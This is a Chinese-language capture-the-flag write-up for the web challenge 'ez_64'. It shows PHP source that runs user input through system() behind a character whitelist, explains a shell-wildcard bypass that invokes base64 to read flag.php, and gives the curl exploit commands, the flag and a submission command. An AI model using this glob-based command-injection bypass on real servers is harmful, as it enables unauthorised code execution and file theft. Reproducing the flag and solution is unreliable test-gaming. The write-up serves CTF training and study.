# ez_64 (题目 4 · Web · 610)

- **flag**: `0xGame{f021b158-6d33-4605-80a9-47edc0487729}`
- **出处**: `/var/www/html/flag.php`（内容 `<?php $flag = '0xGame{...}'; ?>`）
- **提交**: `python3 scripts/ctfplus.py submit 4 '0xGame{...}'` → `{"code":200,"msg":"OK","data":{"result":true}}`
- **PoC**: `scripts/4-solve.py`（复现：`python3 scripts/4-solve.py`）
- **证据**: `evidence/4-solve.log`, `evidence/4-probe-raw.txt`

## 源码（`GET /` 直接 highlight_file 泄露）

```php
<?php
chdir(__DIR__);
if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (preg_match("#^[/?. fla64]*$#", $c)) {
        system($c);
    } else {
        die("no no no!");
    }
} else {
    highlight_file(__FILE__);
}
```

## "64" 是什么

两重含义，都指向同一答案：

1. 允许字符集 `[/?. fla64]` 里的 `6` `4` —— 正好是 **`base64`** 的结尾两个字符。
   命令白名单只有 `/ ? . 空格 f l a 6 4`，写不出 `cat`、`ls`、`base64`（缺 `b s e c t`），
   但 shell 通配符 `?` 可以替任意单字符：
   - `/???/???/?a??64` → `/usr/bin/base64`
2. 文件名同理用 `?` 补齐：目标文件 `flag.php` 是 8 字符 → `????????`。

`preg_match("#^[...]*$#", $c)` 只有字符集限制、没有禁用元字符，`?` 是 shell 通配符 → 经典
**glob 通配符绕过命令白名单**（restricted-charset RCE）。

## 解法

```bash
# 1. 先摸清页面：GET / 无参 -> highlight_file，直接给出源码
curl -s "http://<target>/"

# 2. base64 读出 cwd 下所有 8 字符文件（flag.php 恰为 8 字符）
curl -s --get --data-urlencode "c=/???/???/?a??64 ????????" "http://<target>/"
# -> PD9waHAKJGZsYWcgPSAnMHhHYW1le2YwMjFiMTU4LTZkMzMtNDYwNS04MGE5LTQ3ZWRjMDQ4NzcyOX0nOwo/Pgo=

# 3. 解码即得 flag
```

## 排查过程（要点）

- 无参访问即得源码，无需爆破目录。
- `/fla?`、`/f????` 等根目录通配均无输出 → flag 不在 `/`，在 `/var/www/html`。
- 按文件名长度扫 cwd（`?`、`??` … `????????`）：只有长度 8 和 9 有输出；
  8 = `flag.php`，9 = `index.php`（源码本身），确认目标。
- 注意 `system()` 只回显 stdout，stderr（如 "not found"）不可见，所以"空响应"只代表
  glob 未匹配或命令无 stdout 输出，不能直接判定文件不存在。
- 顺带发现 `/???/???/??????4`（`/usr/bin` 下 7 字符、以 4 结尾的某个命令）会回显
  `No executable lines`，与本题无关，未深究。
